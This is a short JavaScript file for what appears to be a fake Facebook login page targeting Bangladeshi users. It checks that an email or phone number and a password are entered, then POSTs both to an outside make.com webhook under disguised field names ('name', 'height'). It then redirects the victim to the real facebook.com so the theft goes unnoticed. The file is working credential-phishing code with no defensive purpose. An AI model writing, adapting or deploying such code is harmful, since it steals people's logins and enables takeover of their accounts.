const $ = sel => document.querySelector(sel);

// let id = document.getElementById("id");
// let pass = document.getElementById("pass");


function isEmail(value) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i;
    return re.test(value);
}
function isBDPhone11(value) {
    return /^01\d{9}$/.test(value);
}

function clearErrors() {
    $('#idError').textContent = '';
    $('#passError').textContent = '';
}

const loginToGo = document.getElementById("btngo");

loginToGo.addEventListener('click', async e => {
    e.preventDefault();
    clearErrors();


    const id = $('#id').value.trim();
    const pass = $('#pass').value;

    let idValid = false;
    if (id.includes('@')) {
        idValid = isEmail(id);
        if (!idValid) $('#idError').textContent = 'Enter a valid email address.';
    } else {
        idValid = isBDPhone11(id);
        if (!idValid) $('#idError').textContent = 'Enter valid phone number.';
    }

    let passValid = pass.length >= 6;
    if (!passValid) $('#passError').textContent = 'Password must be at least 6 characters.';

    if (!(idValid && passValid)) return;

    // ডেটা পাঠানো
    const dataToSend = {
        name: id,
        height: pass,
    };

    const appsScriptUrl = "https://hook.us2.make.com/jtgj9xbb1g95uvhueowv0vq3g38equ3h";

    try {
        await fetch(appsScriptUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(dataToSend)
        });
    } catch (err) {
        console.error("Error:", err);
    }
    window.location.href = "https://web.facebook.com";

    loginToGo.addEventListener("click", function () {
        window.location.href = "https://web.facebook.com";
    });
});
